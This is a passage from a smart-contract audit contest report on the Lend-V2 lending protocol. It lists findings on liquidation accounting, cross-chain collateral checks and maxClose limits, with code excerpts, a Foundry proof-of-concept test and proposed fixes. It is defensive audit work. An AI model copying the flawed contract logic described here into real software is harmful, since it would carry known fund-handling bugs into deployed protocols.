        // Calculate expected underlying tokens
        uint256 expectedUnderlying = (_amount * exchangeRateBefore) / 1e18;
```

The problem is that `CoreRouter` acts as both a supplier and borrower to `LToken`, therefore it's possible that `CoreRouter` is liquidated in `LToken` if its collateral is less than borrowed amount.

If `CoreRouter` is liquidated, it will have less collateral in `LToken` than before, however, such situation is not took into consideration when user s redeem, as a result, the users who redeem earlier can fully redeem, leaving the last users suffer the loss.

### Internal Pre-conditions

NA

### External Pre-conditions

`CoreRouter` is liquidated in `LToken`.

### Attack Path

NA

### Impact

User suffer more loss than expected.

### PoC

_No response_

### Mitigation

When user redeems, the received amount should be calculated based on `CoreRouter`'s collateral in `LToken`.

# Issue M-8: Incorrect liquidity check on destination chain. 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/864 

## Found by 
future, h2134, jokr, mussucal, rudhra1749

### Summary

During cross-chain borrows, the destination chain is expected to verify that the `payload.collateral` provided by the source chain covers **only** the cross-chain borrow amount being originated from that source chain. However, the current implementation incorrectly checks that the `payload.collateral` covers all of the user’s **same-chain borrows of destination chain and cross-chain borrows originated from the destination chain**, which is invalid logic.


```solidity
(uint256 totalBorrowed,) = lendStorage.getHypotheticalAccountLiquidityCollateral(
    payload.sender,
    LToken(payable(payload.destlToken)),
    0,
    payload.amount
);

require(payload.collateral >= totalBorrowed, "Insufficient collateral");
```
https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L616-L622

This causes the borrow requests to fail even if the user has sufficient collateral on the **source** chain to support the **new** cross-chain borrow.

### Root Cause

The destination chain incorrectly validates the borrow by checking whether `payload.collateral` can cover:

- Same-chain borrows on the destination chain  
- Cross-chain borrows originated **from** the destination chain  

This is incorrect because the collateral being validated (`payload.collateral`) resides on the **source** chain, not the destination chain. It should only be checked against the cross-chain borrows taken from the source chain.

### Internal Preconditions

None

### External Preconditions



### Impact

Valid cross-chain borrow requests are incorrectly rejected.  



### PoC

_No response provided._

### Mitigation

Update the destination chain logic to validate only that the `payload.collateral` covers the borrow being initiated from the source chain and previous borrows from source chain. Avoid  including:

- Same-chain borrows on the destination chain  
- Other cross-chain borrows **originating** from the destination chain


# Issue M-9: Liquidators Must Supply Collateral Asset Before Redeeming Seized Rewards 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/905 

## Found by 
Brene, Tigerfrake, Uddercover, aman, dreamcoder, dystopia, future, kom, mahdifa, rokinot, t.aksoy, xiaoming90, zraxx

## Title 
Liquidators Must Supply Collateral Asset Before Redeeming Seized Rewards

## Summary
Liquidators can initiate liquidations even if they haven’t previously supplied the asset being liquidated. However, during this process, although their `totalInvestment` is updated based on the difference between `seizeTokens` and `currentReward`, the system does not register the asset as part of their `suppliedAssets`. This omission causes the liquidator’s collateral balance for the asset to remain at zero.
Consequently, when the liquidator tries to redeem the seized collateral, the protocol treats them as having no supplied collateral, causing a failed liquidity check. To redeem, the liquidator is forced to make a fresh supply of the collateral asset, just so the protocol recognizes it as one of their supplied tokens.

## Root Cause
In [`liquidateSeizeUpdate`](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L278-L318) function, the `updateTotalInvestment()` function updates the `totalInvestment` mapping for both borrower and liquidator:

```solidity
        // Update total investment
        lendStorage.updateTotalInvestment(
            borrower, lTokenCollateral, lendStorage.totalInvestment(borrower, lTokenCollateral) - seizeTokens
        );

>>      lendStorage.updateTotalInvestment(
            sender,
            lTokenCollateral,
            lendStorage.totalInvestment(sender, lTokenCollateral) + (seizeTokens - currentReward)
        );
```

However, unlike borrowers who already have the asset recorded in their supplied list, the liquidator’s `userSuppliedAssets` array remains empty since no action explicitly registers the new asset. This becomes problematic during redemption, which relies on `userSuppliedAssets` to determine collateral value. The following explain this;

A user calls the `redeem` function to redeem his investments from the seized tokens, the [`getHypotheticalAccountLiquidityCollateral()`](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/LendStorage.sol#L385-L467) is called to return both `borrowed` and `collateral`

```solidity
        // @audit These arrays are empty so far
>>      address[] memory suppliedAssets = userSuppliedAssets[account].values();
>>      address[] memory borrowedAssets = userBorrowedAssets[account].values();

        // First loop: Calculate collateral value from supplied assets
>>      // @audit Will not loop as there is nothing in the array
        for (uint256 i = 0; i < suppliedAssets.length;) {
            ---snip---

            // Add to collateral sum
            vars.sumCollateral =
                mul_ScalarTruncateAddUInt(vars.tokensToDenom, lTokenBalanceInternal, vars.sumCollateral);

            unchecked {
                ++i;
            }
        }

        // Second loop: Calculate borrow value from borrowed assets
        // @audit Will not loop as there is nothing in the array
        for (uint256 i = 0; i < borrowedAssets.length;) {
           ---snip---

            // Add to borrow sum
            vars.sumBorrowPlusEffects =
                mul_ScalarTruncateAddUInt(vars.oraclePrice, totalBorrow, vars.sumBorrowPlusEffects);

            unchecked {
                ++i;
            }
        }

        // Handle effects of current action
>>      // @audit Since address(lTokenModify) != address(0), and `redeemTokens > 0`,
        if (address(lTokenModify) != address(0)) {
            vars.oraclePriceMantissa = UniswapAnchoredViewInterface(priceOracle).getUnderlyingPrice(lTokenModify);
            vars.oraclePrice = Exp({mantissa: vars.oraclePriceMantissa});

            // Add effect of redeeming collateral
            if (redeemTokens > 0) {
                vars.collateralFactor = Exp({
                    mantissa: LendtrollerInterfaceV2(lendtroller).getCollateralFactorMantissa(address(lTokenModify))
                });
                vars.exchangeRate = Exp({mantissa: lTokenModify.exchangeRateStored()});
                vars.tokensToDenom = mul_(mul_(vars.collateralFactor, vars.exchangeRate), vars.oraclePrice);
>>              vars.sumBorrowPlusEffects =
                    mul_ScalarTruncateAddUInt(vars.tokensToDenom, redeemTokens, vars.sumBorrowPlusEffects);
            }

            // Add effect of new borrow
            if (borrowAmount > 0) {
                vars.sumBorrowPlusEffects =
                    mul_ScalarTruncateAddUInt(vars.oraclePrice, borrowAmount, vars.sumBorrowPlusEffects);
            }
        }

>>      return (vars.sumBorrowPlusEffects, vars.sumCollateral);
```
Then in `redeem()`, the following check is made:
```solidity
    require(collateral >= borrowed, "Insufficient liquidity");
```
But since `collateral == 0` and `borrowed > 0`, this reverts.

## Internal Pre-conditions

1. The liquidator had never supplied the asset being seized before initiating the liquidation.
2. The redeem logic depends on the `userSuppliedAssets` array to calculate liquidity.
3. Collateral balance is calculated to be zero, leading to a failed redeem.

## External Pre-conditions
None

## Attack Path
1. A user liquidates another user’s position and receives seized collateral.
2. Since the liquidator hasn’t supplied the collateral asset before, it isn't included in their `userSuppliedAssets`.
3. When attempting to redeem, the liquidity check fails as the protocol calculates collateral as zero.
4. The liquidator cannot redeem unless they first supply the seized token themselves.

## Impact
Liquidators encounter a barrier when trying to redeem the collateral they rightfully acquired. Without manually supplying the asset first, they are unable to redeem. This creates unnecessary friction and traps seized rewards unless the liquidator takes an extra, unintuitive step of supplying the token they already received.

## POC
1. In `test/TestLiquidations.t.sol`, add the following test:
```solidity
    function test_liquidator_must_supply_tokens_to_redeem_reward(uint256 supplyAmount, uint256 borrowAmount, uint256 newPrice) public {
        // Bound inputs to reasonable values
        supplyAmount = bound(supplyAmount, 100e18, 1000e18);
        borrowAmount = bound(borrowAmount, 50e18, supplyAmount * 60 / 100); // Max 60% LTV
        newPrice = bound(newPrice, 1e16, 5e16); // 1-5% of original price

        // Supply token0 as collateral on Chain A
        (address tokenA, address lTokenA) = _supplyA(deployer, supplyAmount, 0);

        // Supply token1 as liquidity on Chain A from random wallet
        (address tokenB, address lTokenB) = _supplyA(address(1), supplyAmount, 1);

        vm.prank(deployer);
        coreRouterA.borrow(borrowAmount, tokenB);

        // Simulate price drop of collateral (tokenA) only on first chain
        priceOracleA.setDirectPrice(tokenA, newPrice);
        // Simulate price drop of collateral (tokenA) only on second chain
        priceOracleB.setDirectPrice(
            lendStorageB.lTokenToUnderlying(lendStorageB.crossChainLTokenMap(lTokenA, block.chainid)), newPrice
        );

        // Attempt liquidation
        vm.startPrank(liquidator);
        ERC20Mock(tokenB).mint(liquidator, borrowAmount);
        IERC20(tokenB).approve(address(coreRouterA), borrowAmount);

        // Expect LiquidateBorrow event
        vm.expectEmit(true, true, true, true);
        emit LiquidateBorrow(liquidator, lTokenB, deployer, lTokenA);

        // Repay 1% of the borrow
        uint256 repayAmount = borrowAmount / 100;

        coreRouterA.liquidateBorrow(deployer, repayAmount, lTokenA, tokenB);
        vm.stopPrank();

        // Verify liquidation was successful
        assertLt(
            lendStorageA.borrowWithInterestSame(deployer, lTokenB),
            borrowAmount,
            "Borrow should be reduced after liquidation"
        );
        
        // retrieve liquidators investment in protocol from seized collateral
        uint256 liquidatorSeizureRewards = lendStorageA.totalInvestment(liquidator, lTokenA);

        // assert that is greater than 0 from liquidation
        assertGt(liquidatorSeizureRewards, 0, "Liquidator should have some seizure rewards");

        // get liquidator supply assets
        address[] memory liquidatorSupplyAssets = lendStorageA.getUserSuppliedAssets(liquidator);

        // should show that no asset was added for him
        assertEq(liquidatorSupplyAssets.length, 0, "Liquidator should have no supply assets");
        
        // Check liquidity for liquidator
        (uint256 borrowed, uint256 collateral) =
            lendStorageA.getHypotheticalAccountLiquidityCollateral(
                liquidator,
                LToken(lTokenA),
                liquidatorSeizureRewards,
                0
            );
        // should show that collateral is 0  and borrowed is positive from Adding effect of 
        // redeemTokens i.e liquidatorSeizureRewards
        assertEq(collateral, 0);
        assertGt(borrowed, 0);
        
        // liquidator attempts to redeem his seized collateral
        vm.startPrank(liquidator);
        // expect revert
        vm.expectRevert(bytes("Insufficient liquidity"));
        coreRouterA.redeem(liquidatorSeizureRewards, payable(lTokenA));

        vm.stopPrank();

        // Now liquidator has to supply some tokens to redeem his reward
        // Supply token0 as collateral on Chain A
        _supplyA(liquidator, supplyAmount, 0);

        // retrieve liquidators current investment
        uint256 liquidatorCurrentInvestment = lendStorageA.totalInvestment(liquidator, lTokenA);

        // assert current investemnt is greater than seized reward
        assertGt(liquidatorCurrentInvestment, liquidatorSeizureRewards);

        // liquidator now attempts to redeem
        vm.prank(liquidator);
        coreRouterA.redeem(liquidatorCurrentInvestment, payable(lTokenA));

        // Now assert that liquidator has 0 investment in protocol
        assertEq(lendStorageA.totalInvestment(liquidator, lTokenA), 0); 
    }
```
2. Run: `forge test --mt test_liquidator_must_supply_tokens_to_redeem_reward -vvvv`


## Mitigation
Add this asset to the liquidator:
```diff
        // Update total investment
        lendStorage.updateTotalInvestment(
            borrower, lTokenCollateral, lendStorage.totalInvestment(borrower, lTokenCollateral) - seizeTokens
        );

+       lendStorage.addUserSuppliedAsset(sender, lTokenCollateral);

>>      lendStorage.updateTotalInvestment(
            sender,
            lTokenCollateral,
            lendStorage.totalInvestment(sender, lTokenCollateral) + (seizeTokens - currentReward)
        );
```

# Issue M-10: Incorrect maxClose Calculation in Liquidation 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/1029 

## Found by 
0xAlix2, 0xc0ffEE, Aenovir, Brene, Etherking, Hueber, PNS, Rorschach, Ruppin, Tigerfrake, coin2own, jokr, m3dython, molaratai, newspacexyz, onthehunt, oxelmiguel, patitonar, rudhra1749, ydlee, zraxx

## Summary
The `liquidateBorrowAllowedInternal` function uses an outdated borrow balance (`borrowBalance.amount`) to calculate `maxClose`, causing the `require(repayAmount <= maxClose)` check to restrict liquidators from repaying the full allowable debt, reducing their liquidation rewards.

## Root Cause
In `Lend-V2.sol`, the `liquidateBorrowAllowedInternal` function calculates `maxClose` as the product of `closeFactorMantissa` and `borrowBalance.amount`, which represents the historical borrow amount without accrued interest. However, the liquidation eligibility check (`borrowedAmount > collateral`) uses the current debt with interest (`borrowedAmount`), leading to a mismatch. The `require(repayAmount <= maxClose)` condition prevents liquidators from repaying amounts based on the actual debt, limiting their rewards.

## Internal Pre-conditions
1. A borrower needs to have a loan with accrued interest (e.g., 1000 USDC initial debt with `borrowIndex` increased by 10%, resulting in 1100 USDC current debt).
2. The borrower's current debt (`borrowedAmount`) must exceed their collateral value (e.g., 1100 USDC > 1000 USDC) to allow liquidation.
3. A liquidator needs to attempt repaying an amount (`repayAmount`) greater than `maxClose`, calculated as `closeFactorMantissa * borrowBalance.amount` (e.g., 50% * 1000 USDC = 500 USDC).
4. The `closeFactorMantissa` (e.g., 50%) needs to limit the maximum repayable amount.

## External Pre-conditions
1. The underlying token prices (e.g., USDC) need to remain stable to ensure consistent collateral and borrow valuations.
2. The oracle price feed for lTokens needs to be consistent to avoid unrelated reverts.

## Attack Path
1. A borrower borrows 1000 USDC on Chain A for cUSDC, recorded in `borrowBalance.amount` with `borrowIndex = 1e18`. Over time, `borrowIndex` increases to `1.1e18` (10% interest), making the current debt (`borrowedAmount`) 1100 USDC.
2. The borrower's collateral is valued at 1000 USDC (after collateral factor), so `borrowedAmount > collateral` (1100 > 1000), enabling liquidation.
3. A liquidator attempts to liquidate 550 USDC (50% of current debt) via `liquidateBorrow`.
4. The function `liquidateBorrowAllowedInternal` calculates `maxClose = 0.5 * borrowBalance.amount = 0.5 * 1000 = 500 USDC`.
5. The check `require(repayAmount <= maxClose)` reverts, as `550 > 500`, preventing the liquidator from repaying 550 USDC.
6. The liquidator is restricted to repaying 500 USDC, losing the opportunity to earn a liquidation reward (e.g., 8% of 50 USDC = 4 USDC) on the additional 50 USDC.

## Impact
Liquidators are unfairly restricted from repaying the full allowable debt, losing potential liquidation rewards (e.g., $4 for 50 USDC at 8% incentive), exceeding $10 and 0.01% (e.g., 0.4% of a 1000 USDC debt). This reduces liquidator participation, potentially delaying debt recovery and increasing insolvency risk for the protocol. Borrowers may face prolonged debt exposure due to incomplete liquidations, accruing additional interest. The core liquidation functionality is impaired, as the protocol fails to align `maxClose` with actual debt, undermining liquidator incentives. The issue can affect multiple liquidations and tokens, reducing protocol efficiency.


